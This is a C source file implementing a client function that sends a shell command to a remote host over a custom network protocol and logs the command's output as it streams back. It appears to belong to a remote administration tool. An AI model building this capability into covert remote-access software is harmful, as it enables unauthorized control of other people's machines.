#include <stdlib.h>
#include <string.h>
#include "server/serv_cmds.h"
#include "net/interface.h"
#include "net/error.h"
#include "logger.h"
#include "types.h"

#define SERV_SYSTEM_DATA 0x1
#define SERV_SYSTEM_END 0x2

#define SERV_SYSTEM_FAILED 0x0F

int serv_SYSTEM(char* str)
{
	int rv = net_SendCmd((uint8*)str, strlen(str), SERV_CMDS_SYSTEM);
	
	free(str);

	if(rv < 1)
	{
		net_PrintLastError();

		return SERV_CMDS_BREAK;
	}

	uint8* rmsg;

	rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES);

	if(rv < 1)
	{
		net_PrintLastError();

		return SERV_CMDS_BREAK;
	}

	if(rmsg[0] == SERV_SYSTEM_FAILED)
	{
		LOG(LOG_ERR, "Failed to start CMD\n");
		free(rmsg);

		return SERV_CMDS_GOOD;
	}

	free(rmsg);
	int rcvCount = 0;
	
	while((rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES)) > 0)
	{
		if(rmsg[0] == SERV_SYSTEM_END)
		{
			free(rmsg);

			break;
		}else if(rmsg[0] == SERV_SYSTEM_DATA){
			LOG(LOG_TABLE, "%s", rmsg + 1);
			rcvCount++;
		}

		free(rmsg);

		if(net_SendEmptyCmd(SERV_CMDS_SYSTEM) < 1)
		{
			net_PrintLastError();
			
			return SERV_CMDS_BREAK;
		}
	}

	if(rv < 1)
	{
		net_PrintLastError();

		return SERV_CMDS_BREAK;
	}

	if(rcvCount < 1)
	{
		LOG(LOG_WAR, "Your command may have error...\n");
	}

	return SERV_CMDS_GOOD;
}